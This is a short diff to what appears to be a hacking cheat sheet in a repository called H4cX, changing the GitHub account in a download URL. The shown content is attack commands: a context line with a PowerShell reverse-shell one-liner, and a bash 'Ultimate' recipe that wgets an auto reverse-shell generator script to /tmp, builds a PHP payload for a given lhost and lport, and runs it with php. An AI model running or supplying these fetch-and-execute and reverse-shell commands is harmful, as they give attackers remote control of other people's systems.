@@ -19,7 +19,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('host',por
 Ultimate :
 ```bash
 rm /tmp/revgen.py
-wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py
+wget -O /tmp/revgen.py https://raw.githubusercontent.com/rea1bacon/H4cX/master/Tools/auto_reverse_shell/autorev.py
 rm /tmp/realexploit.php
 python3 /tmp/revgen.py {lhost} {lport} realexploit.php
 php -f /tmp/realexploit.php
